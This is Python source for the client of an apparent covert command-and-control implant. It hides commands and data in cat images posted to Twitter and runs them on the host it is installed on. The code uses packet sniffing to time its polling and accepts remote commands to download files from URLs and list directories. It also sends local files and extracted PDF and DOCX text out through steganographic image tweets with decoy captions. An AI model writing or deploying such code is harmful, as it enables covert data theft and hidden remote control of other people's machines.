from scapy.all import *
from scapy.layers.tls import *
import cryptography
import time
from handleMessage import encodeFile,decodeFile
import re
import os
from signal import SIGINT,signal
import tweepy
import keys
import urllib.request
import sys
import requests
import random
import json

'''
RUN AS ROOT OR DIE (The program, not you. It will die. Because Scapy.)
'''
# File paths
catmsgPath = "msgs.txt"
hiddenFilePath = "hidden_file.txt"
toServerPath = "toServer_file.txt"
savefilePath = "savefile"
# Global Variables
lastUsed=time.time()
lastChecked=time.time()
interval=60 # default: 900 (15 min)
myId=sys.argv[1]
imgs=["cats/cat1.png","cats/cat2.png"] # must populate with all files in dir
auth = tweepy.OAuthHandler(keys.consumer_key, keys.consumer_secret)
auth.set_access_token(keys.access_token, keys.access_token_secret)
api = tweepy.API(auth)
checkedId=1259644097939283970 # tweet ids to grab from
catMsgs=[]
## limit stuff
lastRateLimit = 0
timeSinceRateLimit = 0

## timey stuff
def updateRateLimit():
    global timeSinceRateLimit
    timeSinceRateLimit = math.ceil(15-(time.time()-lastRateLimit)/60)
    return timeSinceRateLimit

def handleRateLimit():
    global lastRateLimit
    if (time.time() - lastRateLimit)/60 > 15:
        lastRateLimit = time.time()
    print("Error. Rate Limit Exceeded. Please wait " + str(updateRateLimit()) +" minutes") # have count down

def checkRateLimit():
    global lastLimit
    if (time.time() - lastRateLimit)/60 > 15:
        print("Rate has not been exceeded.")
    else:
        print(str(updateRateLimit()) + " minutes till Rate reset.")
'''
Shut Down Client
'''
def shutdown():
    print("Shutting down...")
    catFile=open("msgs.txt")
    for line in catFile:
        catMsgs.append(str(line))
    catFile.close()
    f= open(toServerPath,"w+")
    f.write(str(myId) + " Killed")
    f.close()
    encodeFile(toServerPath,"./cats/cat"+str(random.randint(1,51))+".png")
    sendMessage('new.png')
    time.sleep(2)
    exit(0)

# SIGINT Handler
def handler(sig,frame):
    shutdown()

'''
Tweet an encoded image.
'''
def sendMessage(fname):
    global api
    try:
        api.update_with_media(fname,catMsgs[random.randint(0, len(catMsgs)-1)])
    except tweepy.TweepError:
        handleRateLimit()

'''
clientHello - register client ID on Server, but first, populate the catMsgs array with predefined cat messages
'''
def clientHello():
    global catMsgs
    catFile=open("msgs.txt")
    for line in catFile:
        catMsgs.append(str(line))
    catFile.close()
    f= open(toServerPath,"w+")
    f.write(str(myId) + " Register")
    f.close()
    encodeFile(toServerPath,"./cats/cat"+str(random.randint(1,51))+".png")
    sendMessage('new.png')

'''
Download images from twitter and store their
paths in an array, which is returned.
We check tweets that have been tweeted
from lastChecked onwards. Then, set lastChecked.
We use a different variable than sniff so there are no conflicts.
'''
def getTweets():
    global api
    global checkedId
    global lastRateLimit
    public_tweets = []
    try:
        public_tweets = api.home_timeline(since_id=checkedId) # since_id=id to get since last check
    except tweepy.TweepError:
        handleRateLimit()
        return []
    lastRateLimit = 0
        
    imgs=[]
    for tweet in public_tweets:
        if tweet.id > checkedId:
            checkedId = tweet.id + 1
        imagefiles = []
        if 'media' in tweet.entities: 
            for media in tweet.extended_entities['media']:
                url = media['media_url']
                print(media['media_url'])
                file_location = str(url)
                imagefiles.append(file_location)
                file_location = './cats/' + file_location.rsplit('/', 1)[-1]
                urllib.request.urlretrieve(url, file_location)
                imgs.append(file_location)
    return imgs

'''
downloadFile - get the file from a URL and download it.
rfind finds the last / and names it based on what follows.
so http://google.com/google.png should result in
google.png being saved.
'''
def downloadFile(url):
    r = requests.get(url)
    ind=(url.rfind('/'))+1
    open(url[ind:], 'wb').write(r.content)
    print("Saving " +url)

def uploadFile(fname):
    global api
    encodeFile(fname,"./cats/cat"+str(random.randint(1,51))+".png")
    api.update_with_media('new.png',"I love cats.") #This indicates it is a file upload

def uploadDoc(docname):
    global api
    import textract
    global toServerPath
    if('pdf' in docname):
        txt=str(textract.process(docname, method='pdfminer'))
        #txt=str(textract.process('new.docx',method='docx'))
        print(str(txt))
        f=open("experiment.txt",'w+')
        f.write(txt)
        f.close()
        encodeFile("pdf.txt","./cats/cat"+str(random.randint(1,51))+".png")
        api.update_with_media('new.png',"I really love cats.") #This indicates it is a doc upload
    elif('docx' in docname):
        txt=str(textract.process(docname, method='docx'))
        f=open("docx.txt",'w+')
        f.write(txt)
        f.close()
        encodeFile("docx.txt","./cats/cat"+str(random.randint(1,51))+".png")
        api.update_with_media('new.png',"I really love cats.") #This indicates it is a doc upload

def lsf(dirr):
    if (dirr!="none"):
        dirs=os.listdir(os.path.dirname(os.path.realpath(__file__))+dirr)
    else:
        dirs=os.listdir(os.path.dirname(os.path.realpath(__file__)))
    f=open("list.txt",'w+')
    for files in dirs:
        f.write(str(files)+"\n")
    f.close()
    encodeFile("list.txt","./cats/cat"+str(random.randint(1,51))+".png")
    api.update_with_media('new.png',"Dogs are overrated.") #This indicates it is a doc upload

'''
Check Messages - only called if there is TCP Activity
and it's not been checked in past 5 minutes.
'''
def checkMessages():
    global myId
    global toServerPath
    global lastChecked
    newTweets=getTweets() #array of images with new image tweets - fetch this using API
    lastChecked = time.time()
    if len(newTweets) == 0:
        print("[debug] no new tweets")
        return
    try:
        for img in newTweets:
            decodeFile(img)
            f = open(hiddenFilePath)
            for msg in f:
                print("[debug] message: " + msg)
                msg=msg.split()
                if(msg[2]!="Register"):
                    print("Checking IDs....")
                    if((msg[0]) == myId):
                        print("IDs are equal....")
                        if ("download" in msg[1]):
                            downloadFile(msg[2]) #download the file from the specified URL
                            break
                        elif("ls" in msg[1]):
                            lsf(msg[2])
                            break
                        elif("uploaddoc" in msg[1]):
                            print("Searching for docname " + msg[2])
                            uploadDoc(msg[2])
                            break
                        elif ("upload" in msg[1]):
                            uploadFile(msg[2])
                            break
                            #this should be ok
                        elif ("kill" in msg[1]):
                            shutdown()
                            break
                        # f2 = open(toServerPath,'w+')
                        # f2.write("0 "+ msg[1] + " Received by " + str(myId))
                        # f2.close()
                        # encodeFile(toServerPath,"./cats/cat"+str(random.randint(1,51))+".png")
                        # sendMessage('new.png')
            f.close()
    except:
        print("Either no new images came in or an invalid ID was passed")
'''
Basic Sniffer. Calls checkMessages 
if they haven't been checked in 5 minutes
'''
def sniffer(pkt):
    global lastUsed
    global interval
    curr = time.time()
    if(curr - lastUsed > interval):
        lastUsed = time.time()
        print("[debug] checking messages...")
        checkMessages()
    else:
        pass

def strict_sniffer(pkt):
    if pkt.haslayer('TLS Handshake - Client Hello'):
        global lastUsed
        global interval
        curr = time.time()
        if(curr - lastUsed > interval):
            lastUsed = time.time()
            print("[debug] checking messages...")
            checkMessages()
        else:
            pass
'''
Main - It's Main.
'''
def main():
    global savefilePath
    if int(myId) == 0:
        print('Id cannot be 0. That is the server!')
        sys.exit(1)

    with open(savefilePath) as save:
        savedata = json.load(save)
    
    ids = savedata['id']
    if int(myId) in ids:
        print('Error. Duplicate Id, please choose a client ID that is NOT of the following:')
        print(ids)
        exit(0)

    decision = input("Would you like to use strict sniffer? [y,n] ")
    decision = decision.lower()
        
    signal(SIGINT,handler)
    
    clientHello()

    if decision == 'y':
        pkts = sniff(filter='tcp', prn=strict_sniffer)
    else:
        pkts = sniff(filter='tcp', prn=sniffer)
        
    
    
    print(pkts)

if __name__ == "__main__":
    main()